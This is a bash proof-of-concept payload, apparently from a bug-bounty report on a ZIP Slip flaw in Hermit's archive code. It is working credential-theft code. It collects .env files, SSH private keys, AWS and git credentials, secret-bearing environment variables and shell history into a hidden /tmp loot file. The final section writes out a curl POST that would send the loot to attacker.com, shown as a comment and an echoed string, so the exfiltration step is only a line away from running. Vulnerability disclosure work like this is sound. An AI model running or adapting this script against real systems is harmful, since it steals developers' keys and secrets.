#!/bin/bash
# ============================================================
# 🔴 ATTACKER PAYLOAD — Credential Collection
# Extracted via ZIP Slip in Hermit archive/archive.go
# ============================================================

LOOT_FILE="/tmp/.hermit_loot_$(hostname)_$(date +%s).txt"
DEV_PROJECT="/root/Desktop/Bug Hunting/my-dev-project"

echo "=== HERMIT ZIP SLIP — CREDENTIAL THEFT REPORT ===" > $LOOT_FILE
echo "Timestamp: $(date)" >> $LOOT_FILE
echo "Hostname:  $(hostname)" >> $LOOT_FILE
echo "User:      $(whoami)" >> $LOOT_FILE
echo "Home:      $HOME" >> $LOOT_FILE
echo "" >> $LOOT_FILE

# ── 1. .env files (App secrets, DB passwords, API keys) ──
echo "━━━ .ENV FILES ━━━" >> $LOOT_FILE
for f in "$DEV_PROJECT/.env" "$HOME/.env" "$HOME/projects/.env" "$HOME/work/.env" ".env"; do
    if [ -f "$f" ]; then
        echo "[FOUND] $f" >> $LOOT_FILE
        cat "$f" >> $LOOT_FILE
        echo "" >> $LOOT_FILE
    fi
done

# ── 2. SSH Private Keys ──
echo "━━━ SSH PRIVATE KEYS ━━━" >> $LOOT_FILE
for f in "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "$HOME/.ssh/id_ecdsa" \
         "$DEV_PROJECT/demo_ssh_key.txt"; do
    if [ -f "$f" ]; then
        echo "[FOUND] $f" >> $LOOT_FILE
        cat "$f" >> $LOOT_FILE
        echo "" >> $LOOT_FILE
    fi
done

# ── 3. AWS Credentials ──
echo "━━━ AWS CREDENTIALS ━━━" >> $LOOT_FILE
for f in "$HOME/.aws/credentials" "$DEV_PROJECT/.aws_credentials_demo"; do
    if [ -f "$f" ]; then
        echo "[FOUND] $f" >> $LOOT_FILE
        cat "$f" >> $LOOT_FILE
        echo "" >> $LOOT_FILE
    fi
done

# ── 4. Git credentials & config ──
echo "━━━ GIT CONFIG / CREDENTIALS ━━━" >> $LOOT_FILE
for f in "$HOME/.gitconfig" "$HOME/.git-credentials"; do
    if [ -f "$f" ]; then
        echo "[FOUND] $f" >> $LOOT_FILE
        cat "$f" >> $LOOT_FILE
        echo "" >> $LOOT_FILE
    fi
done

# ── 5. Environment variables (tokens in memory) ──
echo "━━━ ENV VARS (API KEYS / TOKENS) ━━━" >> $LOOT_FILE
env | grep -iE "token|key|secret|password|passwd|api|aws|auth|cred" >> $LOOT_FILE
echo "" >> $LOOT_FILE

# ── 6. Shell history (commands executed) ──
echo "━━━ SHELL HISTORY ━━━" >> $LOOT_FILE
for f in "$HOME/.bash_history" "$HOME/.zsh_history"; do
    if [ -f "$f" ]; then
        echo "[FOUND] $f (last 20 commands)" >> $LOOT_FILE
        tail -20 "$f" >> $LOOT_FILE 2>/dev/null
    fi
done

# ── 7. Simulate Exfiltration ──
echo "" >> $LOOT_FILE
echo "━━━ EXFILTRATION ━━━" >> $LOOT_FILE
echo "In real attack, would send to: https://attacker.com/collect" >> $LOOT_FILE
echo "Command: curl -s -X POST https://attacker.com/collect --data-binary @$LOOT_FILE" >> $LOOT_FILE
# REAL ATTACK MEIN: curl -s -X POST https://attacker.com/collect --data-binary @$LOOT_FILE

echo "Loot saved at: $LOOT_FILE"
cat $LOOT_FILE
